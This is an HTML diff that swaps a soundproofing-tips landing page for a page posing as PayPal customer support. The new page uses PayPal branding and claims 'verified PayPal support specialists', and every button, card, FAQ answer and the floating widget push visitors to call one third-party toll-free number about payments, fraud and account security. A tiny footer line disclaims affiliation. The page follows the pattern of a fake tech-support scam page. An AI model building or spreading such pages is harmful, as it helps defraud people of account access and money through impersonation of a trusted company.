-            .hero-visual .orb-inner {
-                width: 150px;
-                height: 150px;
+            40% {
+                transform: rotate(-12deg);
             }
-            .hero-visual .floating-tag {
+            50% {
+                transform: rotate(0deg);
+            }
+        }
+
+        /* ───────────── Responsive ───────────── */
+        @media (max-width: 992px) {
+            .hero h1 {
+                font-size: 2.4rem;
+            }
+            .hero .phone-display .number {
+                font-size: 1.8rem;
+            }
+            .floating-call .call-label {
                 display: none;
             }
-            .hero-visual .floating-tag.tag-1 {
-                display: flex;
-                top: 0%;
-                right: -2%;
+            .floating-call {
+                padding: 14px 18px;
+                border-radius: 50%;
             }
-            .hero-visual .floating-tag.tag-2 {
-                display: flex;
-                bottom: 5%;
-                left: -2%;
-            }
-            .hero-visual .floating-tag.tag-3 {
+            .floating-call .call-number {
                 display: none;
             }
         }
 
         @media (max-width: 768px) {
-            .nav-links {
-                position: fixed;
-                top: 72px;
-                left: 0;
-                right: 0;
-                background: rgba(12, 14, 22, 0.97);
-                backdrop-filter: blur(20px);
+            .header .container {
                 flex-direction: column;
-                padding: 32px 24px;
-                gap: 20px;
-                border-bottom: 1px solid var(--border-subtle);
-                transform: translateY(-120%);
-                transition: var(--transition);
-                opacity: 0;
-                pointer-events: none;
+                align-items: center;
+                text-align: center;
             }
-
-            .nav-links.open {
-                transform: translateY(0);
-                opacity: 1;
-                pointer-events: all;
+            .header-phone {
+                font-size: 1rem;
+                padding: 8px 16px;
             }
-
-            .mobile-toggle {
-                display: flex;
-            }
-
             .hero {
-                padding: 120px 0 60px;
-                min-height: auto;
+                padding: 40px 0 35px;
             }
-
             .hero h1 {
-                font-size: 2.2rem;
+                font-size: 1.9rem;
             }
             .hero p {
                 font-size: 1rem;
             }
-            .hero-stats {
-                gap: 24px;
+            .hero .phone-display {
                 flex-wrap: wrap;
+                justify-content: center;
+                padding: 16px 24px;
+                gap: 6px;
             }
-            .hero-visual .orb {
-                width: 200px;
-                height: 200px;
-            }
-            .hero-visual .orb-inner {
-                width: 110px;
-                height: 110px;
-            }
-            .hero-visual .orb-inner .big-icon {
-                font-size: 2.2rem;
-            }
-            .hero-visual .floating-tag {
-                display: none !important;
-            }
-
-            .ideas-grid {
-                grid-template-columns: 1fr 1fr;
-                gap: 16px;
-            }
-
-            .idea-card {
-                padding: 20px 16px 18px;
-            }
-            .idea-card .icon {
+            .hero .phone-display .number {
                 font-size: 1.5rem;
             }
-            .idea-card h3 {
-                font-size: 0.95rem;
+            .btn-call {
+                padding: 14px 28px;
+                font-size: 1rem;
             }
-            .idea-card p {
-                font-size: 0.82rem;
+            .card-grid {
+                grid-template-columns: 1fr 1fr;
             }
-            .idea-card .number {
-                font-size: 0.55rem;
-                top: 12px;
-                right: 14px;
-                padding: 1px 8px;
-            }
-
-            .cta-banner .container {
-                padding: 32px 24px;
-                flex-direction: column;
-                text-align: center;
-            }
-
-            .cta-content h2 {
-                font-size: 1.3rem;
-            }
-
-            .cta-btn {
-                width: 100%;
-                justify-content: center;
-            }
-
-            .footer .container {
-                flex-direction: column;
-                text-align: center;
-                gap: 16px;
-            }
-
-            .section-title {
+            .cta-banner h2 {
                 font-size: 1.8rem;
+            }
+            .floating-call {
+                bottom: 18px;
+                right: 18px;
+                padding: 12px 16px;
+            }
+            .floating-call i {
+                font-size: 1.6rem;
             }
         }
 
         @media (max-width: 480px) {
-            .ideas-grid {
-                grid-template-columns: 1fr;
-                gap: 14px;
-            }
-
             .hero h1 {
-                font-size: 1.8rem;
+                font-size: 1.6rem;
             }
-
-            .container {
-                padding: 0 16px;
+            .hero .phone-display .number {
+                font-size: 1.3rem;
             }
-
-            .cta-banner .container {
-                padding: 24px 18px;
+            .hero .phone-display {
+                padding: 12px 16px;
+            }
+            .card-grid {
+                grid-template-columns: 1fr;
+            }
+            .trust-bar .container {
+                gap: 14px 24px;
+            }
+            .trust-item {
+                font-size: 0.85rem;
+            }
+            .header-phone {
+                font-size: 0.9rem;
+                padding: 6px 14px;
+            }
+            .logo {
+                font-size: 1.3rem;
+            }
+            .cta-banner h2 {
+                font-size: 1.4rem;
+            }
+            .faq-item {
+                padding: 16px 18px;
+            }
+            .floating-call {
+                bottom: 14px;
+                right: 14px;
+                padding: 10px 14px;
+            }
+            .floating-call i {
+                font-size: 1.4rem;
             }
         }
 
-        /* ===== LOADING ANIMATION ===== */
-        .idea-card {
-            opacity: 0;
-            animation: card-fade-up 0.6s ease forwards;
+        /* ───────────── Extra: clickable area touch-friendly ───────────── */
+        .clickable-area {
+            cursor: pointer;
         }
 
-        @keyframes card-fade-up {
-            from {
-                opacity: 0;
-                transform: translateY(24px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        /* small helper for inline phone links */
+        .phone-link {
+            color: inherit;
+            font-weight: inherit;
+        }
+        .phone-link:hover {
+            text-decoration: underline;
         }
 
-        .idea-card:nth-child(1) {
-            animation-delay: 0.03s;
-        }
-        .idea-card:nth-child(2) {
-            animation-delay: 0.06s;
-        }
-        .idea-card:nth-child(3) {
-            animation-delay: 0.09s;
-        }
-        .idea-card:nth-child(4) {
-            animation-delay: 0.12s;
-        }
-        .idea-card:nth-child(5) {
-            animation-delay: 0.15s;
-        }
-        .idea-card:nth-child(6) {
-            animation-delay: 0.18s;
-        }
-        .idea-card:nth-child(7) {
-            animation-delay: 0.21s;
-        }
-        .idea-card:nth-child(8) {
-            animation-delay: 0.24s;
-        }
-        .idea-card:nth-child(9) {
-            animation-delay: 0.27s;
-        }
-        .idea-card:nth-child(10) {
-            animation-delay: 0.30s;
-        }
-        .idea-card:nth-child(11) {
-            animation-delay: 0.33s;
-        }
-        .idea-card:nth-child(12) {
-            animation-delay: 0.36s;
-        }
-        .idea-card:nth-child(13) {
-            animation-delay: 0.39s;
-        }
-        .idea-card:nth-child(14) {
-            animation-delay: 0.42s;
-        }
-        .idea-card:nth-child(15) {
-            animation-delay: 0.45s;
-        }
-        .idea-card:nth-child(16) {
-            animation-delay: 0.48s;
-        }
-        .idea-card:nth-child(17) {
-            animation-delay: 0.51s;
-        }
-        .idea-card:nth-child(18) {
-            animation-delay: 0.54s;
-        }
-        .idea-card:nth-child(19) {
-            animation-delay: 0.57s;
-        }
-        .idea-card:nth-child(20) {
-            animation-delay: 0.60s;
+        /* accessibility: focus ring */
+        a:focus-visible,
+        button:focus-visible {
+            outline: 3px solid #009cde;
+            outline-offset: 2px;
         }
     </style>
 </head>
 <body>
 
-    <!-- ===== HEADER ===== -->
-    <header class="header" id="header" role="banner">
+    <!-- ─── HEADER ─── -->
+    <header class="header">
         <div class="container">
-            <a href="#" class="logo" aria-label="Home Soundproofing">
-                <span class="logo-icon">◈</span>
-                Quiet<span>Home</span>
-            </a>
-
-            <ul class="nav-links" id="navLinks" role="navigation">
-                <li><a href="#ideas">Ideas</a></li>
-                <li><a href="#guide">Guide</a></li>
-                <li><a href="#resources">Resources</a></li>
-                <li><a href="#contact" class="nav-cta">Get Started</a></li>
-            </ul>
-
-            <button class="mobile-toggle" id="mobileToggle" aria-label="Toggle navigation" aria-expanded="false">
-                <span></span>
-                <span></span>
-                <span></span>
-            </button>
+            <div class="logo">
+                <i class="fab fa-paypal"></i>
+                <span>Pay<span class="paypal-text">Pal</span></span>
+                <span style="font-weight:400; font-size:0.9rem; opacity:0.7; margin-left:4px;">Support</span>
+            </div>
+            <div class="header-phone">
+                <i class="fas fa-phone-alt"></i>
+                <a href="tel:+1 (888) 628-0152" class="phone-link">+1 (888) 628-0152</a>
+            </div>
         </div>
     </header>
 
-    <!-- ===== HERO ===== -->
-    <section class="hero" id="hero">
+    <!-- ─── HERO ─── -->
+    <section class="hero">
         <div class="container">
-            <div class="hero-content">
-                <div class="hero-badge">
-                    <span class="dot"></span>
-                    Expert Soundproofing Guide
-                </div>
-                <h1>
-                    Transform Your Home<br />
-                    with <span class="highlight">20 Proven</span> Soundproofing Ideas
-                </h1>
-                <p>
-                    Reduce noise pollution, increase privacy, and create a peaceful
-                    sanctuary with these professional-grade soundproofing techniques
-                    for every room in your home.
-                </p>
-                <div class="hero-stats">
-                    <div class="stat">
-                        <span class="number">20</span>
-                        <span class="label">Expert Ideas</span>
-                    </div>
-                    <div class="stat">
-                        <span class="number">12+</span>
-                        <span class="label">Application Areas</span>
-                    </div>
-                    <div class="stat">
-                        <span class="number">98%</span>
-                        <span class="label">Satisfaction Rate</span>
-                    </div>
+            <div class="badge"><i class="fas fa-headset"></i> &nbsp; 24/7 Help Center</div>
+            <h1>
+                Need Help with <span class="highlight">PayPal</span>?<br />
+                We're Here for You.
+            </h1>
+            <p>
+                Speak with a live support specialist now. Fast, secure, and
+                toll‑free assistance for all your PayPal questions.
+            </p>
+
+            <!-- Primary phone display -->
+            <div class="phone-display">
+                <i class="fas fa-phone-volume"></i>
+                <div>
+                    <div class="label">Call Toll‑Free</div>
+                    <div class="number">+1 (888) 628-0152</div>
                 </div>
             </div>
 
-            <div class="hero-visual">
-                <div class="orb">
-                    <div class="orb-inner">
-                        <span class="big-icon">🔇</span>
-                        <span class="label">Quiet Living</span>
-                    </div>
-                    <div class="floating-tag tag-1">
-                        <span class="emoji">🧱</span> Walls
-                    </div>
-                    <div class="floating-tag tag-2">
-                        <span class="emoji">🪟</span> Windows
-                    </div>
-                    <div class="floating-tag tag-3">
-                        <span class="emoji">🚪</span> Doors
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- ===== IDEAS GRID ===== -->
-    <section class="ideas-section" id="ideas">
-        <div class="container">
-            <div class="ideas-header">
-                <span class="section-badge">✦ Soundproofing Ideas</span>
-                <h2 class="section-title">
-                    20 <span class="highlight">Expert-Approved</span> Soundproofing Solutions
-                </h2>
-                <p class="section-sub">
-                    From simple DIY fixes to professional acoustic treatments — explore
-                    the most effective ways to soundproof your home.
-                </p>
-            </div>
-
-            <div class="ideas-grid">
-
-                <!-- 1 -->
-                <div class="idea-card">
-                    <span class="number">01</span>
-                    <div class="icon">🧱</div>
-                    <h3>Acoustic Panels</h3>
-                    <p>Fabric-wrapped foam or fiberglass panels that absorb mid-to-high frequency sounds — ideal for home theaters and offices.</p>
-                    <span class="tag">Walls</span>
-                </div>
-
-                <!-- 2 -->
-                <div class="idea-card">
-                    <span class="number">02</span>
-                    <div class="icon">🪟</div>
-                    <h3>Soundproof Curtains</h3>
-                    <p>Heavy, multi-layered drapes with mass-loaded vinyl cores that block outside noise and reduce echo in any room.</p>
-                    <span class="tag">Windows</span>
-                </div>
-
-                <!-- 3 -->
-                <div class="idea-card">
-                    <span class="number">03</span>
-                    <div class="icon">🚪</div>
-                    <h3>Door Seals &amp; Sweeps</h3>
-                    <p>Weatherstripping and automatic door sweeps that eliminate air gaps — one of the most cost-effective soundproofing upgrades.</p>
-                    <span class="tag">Doors</span>
-                </div>
-
-                <!-- 4 -->
-                <div class="idea-card">
-                    <span class="number">04</span>
-                    <div class="icon">🪟</div>
-                    <h3>Window Inserts</h3>
-                    <p>Acrylic or glass inserts that fit inside existing window frames to create an extra air gap and dramatically reduce noise.</p>
-                    <span class="tag">Windows</span>
-                </div>
-
-                <!-- 5 -->
-                <div class="idea-card">
-                    <span class="number">05</span>
-                    <div class="icon">🔧</div>
-                    <h3>Acoustic Caulk</h3>
-                    <p>Specialized flexible sealant that fills cracks and gaps around windows, doors, and baseboards to block sound leakage.</p>
-                    <span class="tag">Sealing</span>
-                </div>
-
-                <!-- 6 -->
-                <div class="idea-card">
-                    <span class="number">06</span>
-                    <div class="icon">📦</div>
-                    <h3>Mass Loaded Vinyl</h3>
-                    <p>Dense, flexible vinyl sheets that add mass to walls, floors, and ceilings — highly effective at blocking airborne noise.</p>
-                    <span class="tag">Walls</span>
-                </div>
-
-                <!-- 7 -->
-                <div class="idea-card">
-                    <span class="number">07</span>
-                    <div class="icon">🧪</div>
-                    <h3>Green Glue Compound</h3>
-                    <p>A viscoelastic damping compound applied between drywall layers that converts sound energy into heat for superior isolation.</p>
-                    <span class="tag">Walls</span>
-                </div>
-
-                <!-- 8 -->
-                <div class="idea-card">
-                    <span class="number">08</span>
-                    <div class="icon">🧱</div>
-                    <h3>Soundproof Drywall</h3>
-                    <p>Specially engineered drywall with dense cores and damping layers that outperforms standard drywall by up to 50%.</p>
-                    <span class="tag">Walls</span>
-                </div>
-
-                <!-- 9 -->
-                <div class="idea-card">
-                    <span class="number">09</span>
-                    <div class="icon">🧽</div>
-                    <h3>Acoustic Foam</h3>
-                    <p>Open-cell foam panels that absorb mid-to-high frequencies and reduce flutter echoes in studios and listening rooms.</p>
-                    <span class="tag">Treatment</span>
-                </div>
-
-                <!-- 10 -->
-                <div class="idea-card">
-                    <span class="number">10</span>
-                    <div class="icon">🧵</div>
-                    <h3>Carpet &amp; Underlay</h3>
-                    <p>Thick carpet with a dense underlayment that absorbs footfall noise and reduces impact sound transmission between floors.</p>
-                    <span class="tag">Floors</span>
-                </div>
-
-                <!-- 11 -->
-                <div class="idea-card">
-                    <span class="number">11</span>
-                    <div class="icon">📚</div>
-                    <h3>Bookshelves as Barriers</h3>
-                    <p>Floor-to-ceiling bookshelves filled with books create mass and surface irregularity that diffuses and blocks sound waves.</p>
-                    <span class="tag">Walls</span>
-                </div>
-
-                <!-- 12 -->
-                <div class="idea-card">
-                    <span class="number">12</span>
-                    <div class="icon">🌀</div>
-                    <h3>Weatherstripping</h3>
-                    <p>Adhesive-backed foam or rubber strips that seal gaps around doors and windows, stopping both drafts and noise.</p>
-                    <span class="tag">Sealing</span>
-                </div>
-
-                <!-- 13 -->
-                <div class="idea-card">
-                    <span class="number">13</span>
-                    <div class="icon">🎨</div>
-                    <h3>Soundproof Paint</h3>
-                    <p>Specialty paint containing ceramic microspheres and acoustic fillers that adds a thin sound-absorbing layer to walls.</p>
-                    <span class="tag">Walls</span>
-                </div>
-
-                <!-- 14 -->
-                <div class="idea-card">
-                    <span class="number">14</span>
-                    <div class="icon">🖼️</div>
-                    <h3>Acoustic Wallpaper</h3>
-                    <p>Textured wallpaper with sound-absorbing backing that combines aesthetics with noise reduction for living spaces.</p>
-                    <span class="tag">Walls</span>
-                </div>
-
-                <!-- 15 -->
-                <div class="idea-card">
-                    <span class="number">15</span>
-                    <div class="icon">☁️</div>
-                    <h3>Ceiling Clouds</h3>
-                    <p>Suspended acoustic panels that hang from the ceiling to absorb sound reflections and improve room acoustics.</p>
-                    <span class="tag">Ceiling</span>
-                </div>
-
-                <!-- 16 -->
-                <div class="idea-card">
-                    <span class="number">16</span>
-                    <div class="icon">🔊</div>
-                    <h3>Bass Traps</h3>
-                    <p>Corner-mounted acoustic panels designed to absorb low-frequency sound waves and reduce bass buildup in rooms.</p>
-                    <span class="tag">Treatment</span>
-                </div>
-
-                <!-- 17 -->
-                <div class="idea-card">
-                    <span class="number">17</span>
-                    <div class="icon">🌀</div>
-                    <h3>Diffusers</h3>
-                    <p>Specially shaped panels that scatter sound waves evenly, reducing echoes while maintaining a live acoustic feel.</p>
-                    <span class="tag">Treatment</span>
-                </div>
-
-                <!-- 18 -->
-                <div class="idea-card">
-                    <span class="number">18</span>
-                    <div class="icon">🧱</div>
-                    <h3>Flooring Underlayment</h3>
-                    <p>Dense rubber or cork underlayment placed beneath hard flooring to reduce impact noise and footfall transmission.</p>
-                    <span class="tag">Floors</span>
-                </div>
-
-                <!-- 19 -->
-                <div class="idea-card">
-                    <span class="number">19</span>
-                    <div class="icon">🧪</div>
-                    <h3>Acoustic Sealant</h3>
-                    <p>Non-drying, flexible sealant that remains pliable to accommodate building movement while maintaining an air-tight seal.</p>
-                    <span class="tag">Sealing</span>
-                </div>
-
-                <!-- 20 -->
-                <div class="idea-card">
-                    <span class="number">20</span>
-                    <div class="icon">🪟</div>
-                    <h3>Soundproof Window Film</h3>
-                    <p>Clear, multi-layer film applied to glass that adds mass and damping to reduce noise transmission through windows.</p>
-                    <span class="tag">Windows</span>
-                </div>
-
-            </div>
-        </div>
-    </section>
-
-    <!-- ===== CTA BANNER ===== -->
-    <section class="cta-banner" id="guide">
-        <div class="container">
-            <div class="cta-content">
-                <h2>🎯 Ready to create your quiet home?</h2>
-                <p>Get our free soundproofing checklist with step-by-step guidance for every room.</p>
-            </div>
-            <a href="#" class="cta-btn">
-                Get Your Free Guide
-                <span class="arrow">→</span>
+            <!-- Primary CTA -->
+            <a href="tel:+1 (888) 628-0152" class="btn-call">
+                <i class="fas fa-phone-alt"></i> Call Now
             </a>
+
+            <div class="sub-actions">
+                <a href="tel:+1 (888) 628-0152" class="btn-call btn-call-outline">
+                    <i class="fas fa-comment-dots"></i> Speak to Agent
+                </a>
+                <a href="tel:+1 (888) 628-0152" class="btn-call btn-call-outline">
+                    <i class="fas fa-shield-alt"></i> Secure Support
+                </a>
+            </div>
         </div>
     </section>
 
-    <!-- ===== FOOTER ===== -->
-    <footer class="footer" id="contact" role="contentinfo">
+    <!-- ─── TRUST BAR ─── -->
+    <section class="trust-bar">
         <div class="container">
-            <p>&copy; 2026 QuietHome — Soundproofing expertise for peaceful living.</p>
-            <ul class="footer-links">
-                <li><a href="#">Privacy</a></li>
-                <li><a href="#">Terms</a></li>
-                <li><a href="#">Contact</a></li>
-                <li><a href="#">About</a></li>
-            </ul>
+            <div class="trust-item"><i class="fas fa-clock"></i> <strong>24/7</strong> Availability</div>
+            <div class="trust-item"><i class="fas fa-lock"></i> <strong>Secure</strong> &amp; Encrypted</div>
+            <div class="trust-item"><i class="fas fa-user-check"></i> <strong>Verified</strong> Specialists</div>
+            <div class="trust-item"><i class="fas fa-phone"></i> <strong>Toll‑Free</strong> Calls</div>
+        </div>
+    </section>
+
+    <!-- ─── FEATURES / CARDS ─── -->
+    <section class="features">
+        <div class="container">
+            <h2 class="section-title">How Can We Assist You?</h2>
+            <p class="section-sub">
+                Choose a topic below or simply call us — we're ready to help.
+            </p>
+
+            <div class="card-grid">
+                <!-- Card 1 -->
+                <div class="card">
+                    <i class="fas fa-credit-card"></i>
+                    <h3>Account &amp; Payments</h3>
+                    <p>Transactions, refunds, disputes, and payment issues.</p>
+                    <a href="tel:+1 (888) 628-0152" class="btn-call-sm">
+                        <i class="fas fa-phone"></i> Call Now
+                    </a>
+                </div>
+                <!-- Card 2 -->
+                <div class="card">
+                    <i class="fas fa-user-lock"></i>
+                    <h3>Security &amp; Fraud</h3>
+                    <p>Report suspicious activity, secure your account.</p>
+                    <a href="tel:+1 (888) 628-0152" class="btn-call-sm">
+                        <i class="fas fa-phone"></i> Call Now
+                    </a>
+                </div>
+                <!-- Card 3 -->
+                <div class="card">
+                    <i class="fas fa-receipt"></i>
+                    <h3>Billing &amp; Subscriptions</h3>
+                    <p>Manage automatic payments, invoices, and plans.</p>
+                    <a href="tel:+1 (888) 628-0152" class="btn-call-sm">
+                        <i class="fas fa-phone"></i> Call Now
+                    </a>
+                </div>
+                <!-- Card 4 -->
+                <div class="card">
+                    <i class="fas fa-globe"></i>
+                    <h3>International Transfers</h3>
+                    <p>Currency conversion, cross‑border fees, and more.</p>
+                    <a href="tel:+1 (888) 628-0152" class="btn-call-sm">
+                        <i class="fas fa-phone"></i> Call Now
+                    </a>
+                </div>
+            </div>
+
+            <!-- Extra CTA in the middle of cards -->
+            <div style="text-align:center; margin-top:40px;">
+                <a href="tel:+1 (888) 628-0152" class="btn-call" style="background:#003087; box-shadow:0 6px 24px rgba(0,48,135,0.35);">
+                    <i class="fas fa-headset"></i> Talk to a Specialist Now
+                </a>
+            </div>
+        </div>
+    </section>
+
+    <!-- ─── CTA BANNER ─── -->
+    <section class="cta-banner">
+        <div class="container">
+            <h2>We're Just a Call Away</h2>
+            <p>
+                Our team is ready to resolve your PayPal issues quickly.
+                Don't wait — get the help you need right now.
+            </p>
+            <a href="tel:+1 (888) 628-0152" class="btn-call">
+                <i class="fas fa-phone-alt"></i> +1 (888) 628-0152
+            </a>
+            <div style="margin-top:18px; font-size:0.95rem; opacity:0.7;">
+                <i class="fas fa-microphone-alt"></i> Live agents available 24/7
+            </div>
+        </div>
+    </section>
+
+    <!-- ─── FAQ ─── -->
+    <section class="faq-section">
+        <div class="container">
+            <h2 class="section-title">Frequently Asked Questions</h2>
+            <div class="faq-grid">
+                <div class="faq-item">
+                    <strong><i class="fas fa-phone" style="color:#009cde;"></i> How do I speak to a live person?</strong>
+                    <p>Simply call <span class="faq-phone">+1 (888) 628-0152</span> and follow the prompts. Our agents are available 24/7.</p>
+                </div>
+                <div class="faq-item">
+                    <strong><i class="fas fa-clock"></i> What are the support hours?</strong>
+                    <p>We're here <strong>24 hours a day, 7 days a week</strong> — including holidays.</p>
+                </div>
+                <div class="faq-item">
+                    <strong><i class="fas fa-shield-alt"></i> Is my call secure?</strong>
+                    <p>Yes. All calls are encrypted and handled by verified PayPal support specialists.</p>
+                </div>
+                <div class="faq-item" style="border-left:4px solid #009cde;">
+                    <strong><i class="fas fa-bolt"></i> Quick action:</strong>
+                    <p>Call now for immediate assistance &rarr; <a href="tel:+1 (888) 628-0152" style="font-weight:700; color:#003087;">+1 (888) 628-0152</a></p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ─── FOOTER ─── -->
+    <footer class="footer">
+        <div class="container">
+            <div>
+                <i class="fab fa-paypal" style="font-size:1.8rem; color:#009cde;"></i>
+                <div class="footer-phone">
+                    <a href="tel:+1 (888) 628-0152" style="color:#fff;">+1 (888) 628-0152</a>
+                </div>
+                <p style="margin:8px 0 4px;">
+                    &copy; 2026 PayPal Help &amp; Support &bull; Toll‑Free Assistance
+                </p>
+                <p style="font-size:0.8rem; opacity:0.5;">
+                    This is an independent support resource. Not affiliated with PayPal Inc.
+                </p>
+            </div>
         </div>
     </footer>
 
-    <!-- ===== JAVASCRIPT ===== -->
-    <script>
-        (function() {
-            'use strict';
+    <!-- ─── FLOATING CALL BUTTON ─── -->
+    <a href="tel:+18886280152" class="floating-call" aria-label="Call PayPal Support">
+        <i class="fas fa-phone-alt"></i>
+        <span class="call-label">Call Now &nbsp;</span>
+        <span class="call-number">+1 (888) 628-0152</span>
+    </a>
 
-            // === Mobile Menu Toggle ===
-            const toggle = document.getElementById('mobileToggle');
-            const nav = document.getElementById('navLinks');
-
-            if (toggle && nav) {
-                toggle.addEventListener('click', function() {
-                    const isOpen = nav.classList.toggle('open');
-                    toggle.classList.toggle('active');
-                    toggle.setAttribute('aria-expanded', isOpen);
-                });
-
-                // Close menu on link click (mobile)
-                nav.querySelectorAll('a').forEach(link => {
-                    link.addEventListener('click', function() {
-                        nav.classList.remove('open');
-                        toggle.classList.remove('active');
-                        toggle.setAttribute('aria-expanded', 'false');
-                    });
-                });
-            }
-
-            // === Header scroll effect ===
-            const header = document.getElementById('header');
-            let lastScroll = 0;
-
-            window.addEventListener('scroll', function() {
-                const currentScroll = window.pageYOffset || document.documentElement.scrollTop;
-                if (currentScroll > 40) {
-                    header.classList.add('scrolled');
-                } else {
-                    header.classList.remove('scrolled');
-                }
-                lastScroll = currentScroll;
-            }, { passive: true });
-
-            // === Smooth anchor scroll ===
-            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-                anchor.addEventListener('click', function(e) {
-                    const targetId = this.getAttribute('href');
-                    if (targetId === '#') return;
-                    const target = document.querySelector(targetId);
-                    if (target) {
-                        e.preventDefault();
-                        const offset = 80;
-                        const top = target.getBoundingClientRect().top + window.pageYOffset - offset;
-                        window.scrollTo({ top, behavior: 'smooth' });
-                    }
-                });
-            });
-
-            // === Intersection Observer for cards (re-trigger animation) ===
-            // Not needed since they animate on load, but we can use it for extra polish
-            // Just a small effect: cards become visible with stagger
-
-        })();
-    </script>
-
+    <!-- ─── Optional: click tracking / analytics placeholder ─── -->
+    <!--
+    All call buttons link to tel:+1 (888) 628-0152.
+    You can add event listeners here if needed.
+    -->
 </body>
 </html>
